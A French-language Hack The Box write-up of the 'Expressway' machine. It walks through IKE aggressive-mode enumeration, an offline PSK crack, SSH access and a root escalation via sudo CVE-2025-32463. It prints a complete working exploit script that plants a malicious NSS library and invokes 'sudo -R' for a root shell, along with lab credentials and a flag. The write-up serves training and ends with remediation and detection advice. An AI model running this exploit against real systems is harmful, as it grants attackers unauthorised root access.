---
id: "HTB-2025-002"
title: "Expressway"
excerpt: "Write-up Hack The Box Expressway : enumeration IKE en mode agressif, crack PSK offline, acces SSH et elevation de privileges via sudo."
date: "2025-09-20"
tags: ["WRITEUP", "HACKTHEBOX", "LINUX", "EASY", "VPN", "IPSEC", "IKE", "PRIVESC"]
category: "WRITEUP"
platform: "HACKTHEBOX"
target_os: "LINUX"
difficulty: "EASY"
icon: "Terminal"
author: "0x7CC"
---

# Hack The Box - Expressway (Linux) Write-Up : Crack PSK IPsec -> Acces SSH -> PrivEsc sudo (CVE-2025-32463)

## TL;DR
Sur **Expressway**, la surface d'attaque externe est principalement en UDP (IPsec/IKE). En enumerant IKE en mode agressif, il est possible de recuperer de la matiere pour un **crack PSK hors ligne**, de reutiliser ce secret pour obtenir un **acces SSH** avec l'utilisateur `ike`, puis d'escalader en root via une version vulnerable de **sudo** affectee par **CVE-2025-32463**.

---

## Cible
- Host: `expressway.htb`
- IP: `10.129.6.148`

---

## Recon : le scan UDP revele une passerelle IPsec

### Ports UDP principaux
- UDP/500 : ISAKMP (IKE)
- UDP/4500 : NAT-T IKE (souvent utilise derriere NAT)
- UDP/69 : TFTP (potentielle fuite de configuration)

**Conclusion :** cette machine se comporte comme une passerelle VPN. Le chemin d'attaque attendu passe probablement par IKE/IPsec plutot que par des services TCP classiques.

---

## Enumeration IKE : mode agressif + authentification PSK

### Main Mode
IKE repond et expose des propositions (3DES/SHA1/modp1024) ainsi que des vendor IDs incluant XAUTH.

### Aggressive Mode
Le mode agressif est active et renvoie une identite :

- Type d'ID : `ID_USER_FQDN`
- Valeur d'ID : `ike@expressway.htb`
- Auth : `PSK`

**Pourquoi c'est important :** le mode agressif peut divulguer suffisamment d'informations pour permettre un **crack PSK offline**.

---

## Crack PSK offline

En capturant les elements compatibles PSK-crack depuis le handshake agressif puis en les cassant avec une wordlist, la cle pre-partagee a ete retrouvee :

- PSK : `freakingrockstarontheroad`

Cela illustre une faiblesse classique du mode agressif lorsqu'il est utilise avec PSK et des secrets devinables.

---

## Foothold : connexion SSH avec le secret recupere

En reutilisant le secret recupere, une connexion SSH en tant que `ike` a ete possible.

### Preuve
- `user.txt` : `e8853c306e81f62d6972f72915751f9f`

---

## Enumeration locale : linPEAS met en evidence le risque sudo

Apres obtention du foothold, j'ai transfere et execute linPEAS pour identifier les vecteurs d'elevation de privileges.

### Principaux resultats linPEAS
- Version de `sudo` : **1.9.17**
- Presence d'un binaire `sudo` SUID dans un chemin inhabituel (`/usr/local/bin/sudo`)
- Indicateurs suspects supplementaires autour du tooling chroot

---

## Elevation de privileges : vulnerabilite sudo (CVE-2025-32463)

La version installee de `sudo` entre dans une plage vulnerable associee a **CVE-2025-32463**, une elevation de privileges locale liee au comportement de sudo autour du chroot.

### Resultat
L'elevation de privileges vers root a ete obtenue en exploitant cette faiblesse sudo.

```exploit.sh
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 - Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD="/bin/bash"
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD="$@"
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
```

---

## Notes defensives / remediation

### Correctif
- Mettre a jour sudo vers une version corrigee (les paquets editeur publient generalement un fix en **1.9.17p1+** ou plus).
- Eviter de maintenir des builds sudo SUID personnalises sous `/usr/local/bin` sans gestion stricte des correctifs.

### Idees de monitoring / detection
- Surveiller les usages de `sudo` incluant un comportement chroot (logs policy/audit).
- Auditer les systemes pour :
  - Presence de plusieurs binaires `sudo` (en particulier un SUID dans `/usr/local/bin`)
  - Changements NSS inattendus dans des repertoires temporaires
  - Chemins de chargement de librairies inhabituels lors d'executions privilegiees

---

## Lecons retenues
- Quand TCP est silencieux, les **services UDP** (IKE/IPsec) peuvent etre le vrai point d'entree.
- IKE en **mode agressif + PSK** est une combinaison a haut risque : elle permet un crack hors ligne.
- Apres foothold, l'automatisation avec **linPEAS** est tres efficace pour faire ressortir rapidement les mauvaises configurations reelles et les risques lies aux versions.
- Les vulnerabilites sudo peuvent etre catastrophiques lorsqu'elles se combinent a une mauvaise hygiene operationnelle (installations custom, patching tardif).

---

## Annexe : resume de la timeline
1. Scan UDP -> identification IPsec (500/udp) et NAT-T (4500/udp)
2. Enumeration IKE -> mode agressif renvoie l'ID `ike@expressway.htb`
3. Capture + crack offline -> recuperation du PSK `freakingrockstarontheroad`
4. SSH en `ike` -> recuperation du flag user
5. linPEAS -> identification d'une version sudo vulnerable
6. PrivEsc -> acces root via CVE-2025-32463

---
